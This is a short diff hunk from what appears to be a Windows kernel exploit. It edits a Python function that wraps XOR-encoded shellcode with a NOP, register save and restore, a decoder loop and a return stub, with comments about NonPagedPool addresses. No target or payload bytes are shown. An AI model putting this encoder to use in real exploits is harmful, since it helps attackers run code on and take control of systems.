@@ -382,12 +382,12 @@ def xored_shellcode(sc):
     decoder += "\xE2\xF2"                 # loop decode_loop
     
     result = ""
-    result += "\x90"  # NonPagedPool object address always like 0xXXXX~00, need to terminate that NULL
-    result += pusha() # pusha code for register backup before XOR decoding
+    result += "\x90"     # NonPagedPool object address always like 0xXXXX~00, need to terminate that NULL
+    result += pusha()    # pusha code for register backup before XOR decoding
     result += decoder
     result += xored_sc
-    result += popa()
-    result += go_back_home()
+    result += popa()     # popa code for register restore after XOR decoding
+    result += return_0()
 
     return result
 
